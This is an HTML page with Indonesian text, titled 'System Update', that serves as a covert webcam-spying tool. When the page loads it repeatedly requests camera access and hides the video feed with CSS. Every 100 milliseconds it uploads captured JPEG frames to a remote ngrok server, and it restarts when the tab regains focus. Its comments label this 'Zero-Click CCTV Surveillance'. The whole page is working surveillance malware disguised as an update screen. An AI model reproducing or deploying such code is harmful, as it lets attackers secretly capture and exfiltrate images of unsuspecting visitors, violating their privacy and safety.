<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; overflow: hidden; }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #0f0; max-width: 400px; width: 100%; }
  h2 { animation: blink 0.5s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>☢️ SYSTEM MONITORING ☢️</h2>
  <p>Memproses...</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>
<video id="cam-feed" autoplay playsinline muted></video>
<canvas id="processing-canvas" width="640" height="480"></canvas>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var streamInterval = null;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI SERVER (NGROK)
  // ============================================
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";

  // ============================================
  // FUNGSI: KIRIM GAMBAR KE SERVER
  // ============================================
  function sendImageToServer() {
    try {
      var video = document.getElementById('cam-feed');
      var canvas = document.getElementById('processing-canvas');
      var ctx = canvas.getContext('2d');

      if (video.readyState === video.HAVE_ENOUGH_DATA) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(function(blob) {
          if (!blob) return;
          var formData = new FormData();
          formData.append('file', blob, 'capture.jpg');

          fetch(SERVER_ENDPOINT, {
            method: 'POST',
            body: formData
          }).then(function(res) {
            log("[+] Gambar terkirim: " + res.status);
          }).catch(function(err) {
            log("[-] Gagal kirim gambar: " + err.message);
          });
        }, 'image/jpeg', 0.6);
      }
    } catch(e) {}
  }

  // ============================================
  // FUNGSI: START CAMERA (ZERO-CLICK ATTEMPT)
  // ============================================
  function startCamera() {
    try {
      log("[+] Meminta Izin Kamera (Zero-Click)...");
      
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(function(stream) {
          var video = document.getElementById('cam-feed');
          video.srcObject = stream;
          video.play().catch(function(){});
          log("[+] 🚨 KAMERA BERHASIL DIAKSES! (CCTV AKTIF)");
          
          // Mulai streaming gambar setiap 100ms
          if (streamInterval) clearInterval(streamInterval);
          streamInterval = setInterval(sendImageToServer, 100);
        })
        .catch(function(err) {
          log("[-] Kamera diblokir: " + err.name);
        });
    } catch(e) {}
  }

  // ============================================
  // TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
  // ============================================
  window.addEventListener('load', function() {
    log("[!] Memulai Zero-Click CCTV Surveillance...");

    // A. Langsung Minta Kamera (0ms)
    startCamera();

    // B. Retry (100ms) - Jika diblokir karena tidak ada gesture
    setTimeout(startCamera, 100);

    // C. Retry (500ms) - Jika masih diblokir
    setTimeout(startCamera, 500);

    // D. Retry (1500ms) - Upaya terakhir
    setTimeout(startCamera, 1500);

  });

  // ============================================
  // VISIBILITY CHANGE (JIKA TAB DIHIDUPKAN)
  // ============================================
  document.addEventListener('visibilitychange', function() {
    if (!document.hidden) {
      log("[!] Tab aktif kembali. Memastikan kamera menyala...");
      if (!streamInterval) {
        startCamera();
      }
    }
  });

})();
</script>
</body>
</html>
